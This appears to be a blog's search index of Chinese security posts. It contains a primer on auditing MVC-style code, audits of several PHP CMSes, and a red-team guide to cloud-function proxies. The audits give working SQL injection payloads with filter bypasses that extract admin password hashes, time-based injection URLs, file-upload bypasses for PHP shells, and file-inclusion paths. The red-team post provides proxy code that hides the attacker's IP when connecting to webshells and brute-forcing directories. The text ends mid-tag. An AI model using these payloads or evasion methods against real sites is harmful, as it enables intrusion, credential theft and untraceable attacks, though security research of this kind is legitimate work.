<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>入门MVC结构代码审计</title>
      <link href="/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/12/%E5%85%A5%E9%97%A8MVC%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="入门MVC结构代码审计"><a href="#入门MVC结构代码审计" class="headerlink" title="入门MVC结构代码审计"></a>入门MVC结构代码审计</h1><ul><li>**Model :**模型层（用于数据库打交道）</li><li>**View :**视图层（用于展示内容给用户看）</li><li><strong>Controller</strong> :控制层（控制业务逻辑）</li></ul><p>M是指业务模型，V是指用户界面，C则是控制器</p><p>MVC各部分的职能：</p><ul><li>模型Model – 管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</li><li>控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。</li><li>视图View – 负责渲染数据，通过HTML方式呈现给用户。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208121558721.gif" alt="MVC流程图"></p><blockquote><p>一个典型的Web MVC流程：</p><ol><li>Controller截获用户发出的请求；</li><li>Controller调用Model完成状态的读写操作；</li><li>Controller把数据传递给View；</li><li>View渲染最终结果并呈献给用户。</li></ol></blockquote><p>MVC 一般有两种审计模式：</p><h4 id="直接审计控制器"><a href="#直接审计控制器" class="headerlink" title="直接审计控制器"></a>直接审计控制器</h4><blockquote><p>也就C的内容，再追踪一些函数。全局搜索一下**filt__**，因为 <strong>filt</strong> 的英文意思为过滤，可以通过全局搜索这样式的函数来查看一下过滤规则。这种一般是比较快速审计。</p><p>但是这种情况一般建立在你可以清晰明白该款CMS的路由规则，适合老鸟，方便根据审计出来的漏洞的点去回溯验证</p></blockquote><h4 id="从index页面通读审计"><a href="#从index页面通读审计" class="headerlink" title="从index页面通读审计"></a>从index页面通读审计</h4><blockquote><p>从头到尾，新手入门审计方式</p></blockquote><p><u><strong>使用MVC模式开发我们在代码审计中需要注意：文件路径不等于访问的url。</strong></u></p><h3 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h3><p><a href="http://127.0.0.1/index.php?s=member&amp;c=account&amp;m=avatar">http://127.0.0.1/index.php?s=member&amp;c=account&amp;m=avatar</a></p><p>使用MVC开发的程序，路由形式并不是文件路径，而是以传参的方式进行访问，那么我们如果通过路由定位到该头像上传的函数呢？？？</p><p><strong>打开审计系统导入源码</strong></p><blockquote><p>1、访问index.php  —&gt;  define(‘FCPATH’, dirname(<strong>FILE</strong>).’&#x2F;finecms&#x2F;‘);   &#x2F;&#x2F; 得到程序路径为finecms</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208121610735.png"></p><blockquote><p>2、进入finecms目录下查看init.php初始化文件  —&gt;  define(‘VIEWPATH’, FCPATH . ‘dayrui&#x2F;‘); &#x2F;&#x2F; 得到主项目目录</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208121611927.png" alt="image-202208121611927"></p><blockquote><p>3、进入dayrui目录下根据参数s&#x3D;member&amp;c&#x3D;account&amp;m&#x3D;avatar进行搜索方法<br>s  –&gt; 目录<br>c  –&gt; 文件<br>m  –&gt; 方法</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208121612998.png" alt="image-202208121612998"></p><p>定位到相关文件和方法后即可继续分析代码是否存在漏洞。</p><p><strong>参考与引用：</strong></p><p><a href="https://blog.csdn.net/weixin_44032232/article/details/113975234">https://blog.csdn.net/weixin_44032232/article/details/113975234</a></p><p><a href="https://cloud.tencent.com/developer/article/1942815">https://cloud.tencent.com/developer/article/1942815</a></p><p><a href="https://www.cnblogs.com/wsybky/p/8638876.html">https://www.cnblogs.com/wsybky/p/8638876.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Beescms V4.0审计</title>
      <link href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="beescms"><a href="#beescms" class="headerlink" title="beescms"></a>beescms</h1><h2 id="前台管理登录界面注入"><a href="#前台管理登录界面注入" class="headerlink" title="前台管理登录界面注入"></a>前台管理登录界面注入</h2><p><a href="http://127.0.0.1/beescms/admin/login.php">http://127.0.0.1/beescms/admin/login.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>()默认仅编码双引号</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$rel</span>=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,select database(),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;利用双写+空格绕过过滤<br>&#x2F;&#x2F;爆破表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect table_name fr from om information_schema.tables wh where ere table_schema like &#x27;</span>beescms<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破列名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect column_name fr from om information_schema.columns wh where ere table_name like &#x27;</span>bees_admin<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破admin账户名:admin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect admin_name fr from om beescms.bees_admin limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;结合substr全部爆破密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,substr((selselectect admin_password fr from om beescms.bees_admin limit 0,1),3,32),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;21232f297a57a5a743894a0e4a801fc3很明显的md5函数处理：admin</p><h2 id="后台文件上传1"><a href="#后台文件上传1" class="headerlink" title="后台文件上传1"></a>后台文件上传1</h2><p>mime类型绕过<br><a href="http://127.0.0.1/beescms/admin/admin_pic_upload.php">http://127.0.0.1/beescms/admin/admin_pic_upload.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span>=<span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">up_img</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$size</span>,<span class="variable">$type</span>,<span class="variable">$thumb</span>=<span class="number">0</span>,<span class="variable">$thumb_width</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$thumb_height</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_alt</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file_type</span>=<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_type</span>),<span class="variable">$type</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">msg</span>(<span class="string">&#x27;上传图片格式不正确&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只对Content-Type： 进行了对比<br>所以修改Content-Type： 即可进行文件上传绕过<br>Content-Disposition: form-data; name&#x3D;”up[]”; filename&#x3D;”1.php”<br>Content-Type: image&#x2F;png</p><h2 id="后台文件上传2"><a href="#后台文件上传2" class="headerlink" title="后台文件上传2"></a>后台文件上传2</h2><p>同样是mime类型绕过<br>up_img()函数<br><a href="http://127.0.0.1/beescms/admin/upload.php">http://127.0.0.1/beescms/admin/upload.php</a></p><h2 id="后台文件上传3"><a href="#后台文件上传3" class="headerlink" title="后台文件上传3"></a>后台文件上传3</h2><p><a href="http://127.0.0.1/beescms/admin/admin_sys.php">http://127.0.0.1/beescms/admin/admin_sys.php</a><br>修改允许上传文件类型<br>添加一个php类型<br>然后<br><a href="http://127.0.0.1/beescms/admin/admin_file_upload.php">http://127.0.0.1/beescms/admin/admin_file_upload.php</a><br>即可上传php文件</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KKCMS v1.32审计</title>
      <link href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="KKCMS-v1-32审计"><a href="#KKCMS-v1-32审计" class="headerlink" title="KKCMS v1.32审计"></a>KKCMS v1.32审计</h1><h2 id="前台注入1"><a href="#前台注入1" class="headerlink" title="前台注入1"></a>前台注入1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/bplay.php?play=a AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</span></span><br></pre></td></tr></table></figure><h2 id="前台注入2"><a href="#前台注入2" class="headerlink" title="前台注入2"></a>前台注入2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#x27; AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND &#x27;qLKJ&#x27;=&#x27;qLKJ</span></span><br></pre></td></tr></table></figure><h2 id="未授权添加用户"><a href="#未授权添加用户" class="headerlink" title="未授权添加用户"></a>未授权添加用户</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/kkcms/ucenter/cms_user_add.php</span></span><br></pre></td></tr></table></figure><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1 AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</span></span><br></pre></td></tr></table></figure><p>这套一堆都是重复的注入</p><p>没意思 不写了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熊海CMS V1.0审计</title>
      <link href="/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="熊海CMS-V1-0审计"><a href="#熊海CMS-V1-0审计" class="headerlink" title="熊海CMS V1.0审计"></a>熊海CMS V1.0审计</h1><p>vscode+phpsuty</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><a href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin*&amp;password=<span class="number">123456</span>&amp;login=yes</span><br></pre></td></tr></table></figure><h2 id="前台文件包含"><a href="#前台文件包含" class="headerlink" title="前台文件包含"></a>前台文件包含</h2><p><a href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure><h2 id="后台文件包含"><a href="#后台文件包含" class="headerlink" title="后台文件包含"></a>后台文件包含</h2><p><a href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure><h2 id="前台注入"><a href="#前台注入" class="headerlink" title="前台注入"></a>前台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>addslashes 防SQL注入 转义单引号 ‘  &#39;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE content SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>; <span class="comment">//这里没用到单引号闭合 所以存在SQL注入</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防演练之云函数的利用</title>
      <link href="/2022/08/05/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B9%8B%E4%BA%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2022/08/05/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B9%8B%E4%BA%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防演练之云函数的利用"><a href="#攻防演练之云函数的利用" class="headerlink" title="攻防演练之云函数的利用"></a>攻防演练之云函数的利用</h1><p>云函数（Serverless CloudFunction，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。</p><p>由于云函数无法长驻，调用的时候创建，执行完之后立即就销毁，所以无法直接保存状态。也正是这一点，让我们无法代理像 SSH 这种需要长连接的服务，只能代理 HTTP(s) 这种无状态的协议。</p><p>云函数不能直接调用，同时还需要创建一个触发器来触发云函数，为了方便，我们选择使用API 网关触发器，只需要一个 HTTP 请求就能触发。</p><p><strong>腾讯云函数地址：</strong></p><p><a href="https://console.cloud.tencent.com/scf/index">https://console.cloud.tencent.com/scf/index</a></p><p>利用云函数的多出口、无需服务器承载的特性，我们可以在实战攻防演练中实现隐藏自身。</p><p>具体应用如下：</p><h3 id="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"><a href="#1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell" class="headerlink" title="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"></a>1、<strong>利用云函数API配置蚁剑实现隐藏自身IP连接Webshell</strong></h3><p> 首先创建云函数：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208011625530.png" alt="image-202208011625530"></p><p><strong>函数代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment">#忽略证书校验</span></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    _create_unverified_https_context = ssl._create_unverified_context</span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ssl._create_default_https_context = _create_unverified_https_context</span><br><span class="line">    </span><br><span class="line">user_agent = [<span class="string">&#x27;Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">requests_headers</span>():</span><br><span class="line">    UA = random.choice(user_agent)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: UA,</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;10.10.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>)), <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment">#url = unquote(event[&#x27;queryString&#x27;][&#x27;url&#x27;])</span></span><br><span class="line">    url = event[<span class="string">&#x27;queryString&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    agrs = event[<span class="string">&#x27;queryString&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> agrs.keys():</span><br><span class="line">        <span class="keyword">if</span> key != <span class="string">&quot;url&quot;</span>:</span><br><span class="line">            url += <span class="string">&quot;&amp;&quot;</span> +  key + <span class="string">&quot;=&quot;</span> + agrs[key]</span><br><span class="line">    method = event[<span class="string">&#x27;httpMethod&#x27;</span>]</span><br><span class="line">    headers = requests_headers()</span><br><span class="line">    <span class="comment">#headers = event[&#x27;headers&#x27;]</span></span><br><span class="line">    timeout = <span class="number">60</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = event[<span class="string">&#x27;body&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        headers.update(&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;)</span><br><span class="line">        html = requests.post(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="keyword">elif</span> method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        html = requests.get(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(html.text))</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: html.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: html.text</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着在函数管理这里将执行超时时间设置为900秒</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020853243.png" alt="image-20220802085326165"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020854463.png" alt="image-20220802085338583"></p><p><strong>创建触发器：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852566.png" alt="image-20220802085206404"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852869.png" alt="image-20220802085237776"></p><p>会得到一个访问路径</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020858448.png" alt="image-20220802085845373"></p><p>利用蚁剑进行Webshell连接即可</p><p>路径为：</p><p><a href="https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell%E5%9C%B0%E5%9D%80">https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell地址</a></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020900807.png" alt="image-20220802090055742"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041881.png" alt="image-20220802104133594"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041975.png" alt="image-20220802104151793"></p><p>可以看到日志里的ip都是上海的</p><h2 id="2、联动dirsearch多出口爆破目录防BanIP"><a href="#2、联动dirsearch多出口爆破目录防BanIP" class="headerlink" title="2、联动dirsearch多出口爆破目录防BanIP"></a>2、联动dirsearch多出口爆破目录防BanIP</h2><p>首先下载一下SCF-Proxy</p><p>项目地址：<a href="https://github.com/hashsecteam/scf-proxy"><a href="https://github.com/Sakurasan/scf-proxy">GitHub - Sakurasan&#x2F;scf-proxy: 云函数代理服务</a></a></p><p>Go环境下编译一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh build.sh</span><br></pre></td></tr></table></figure><p>获得一个main.zip</p><p>接着在&#x2F;scf-proxy&#x2F;cmd 路径下编译一下 client.go</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -trimpath client.go</span><br></pre></td></tr></table></figure><p><strong>新建云函数</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021142219.png" alt="image-20220802114215068"></p><p><strong>创建触发器</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021143851.png" alt="image-20220802114341667"></p><p>同样别忘记了设置超时时间900秒</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021144244.png" alt="image-20220802114450106"></p><p>然后客户端设置监听</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./<span class="keyword">client</span> -p <span class="number">8888</span> -scfurl https:<span class="comment">//云函数访问路径</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021152005.png" alt="image-20220802115207900"></p><p>这里就算成功了</p><p>效果测试</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021200131.png" alt="image-20220802120024033"></p><p>使用dirsearch爆破目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxxxxx.com --proxy=http://localhost:8888</span><br></pre></td></tr></table></figure><p><img 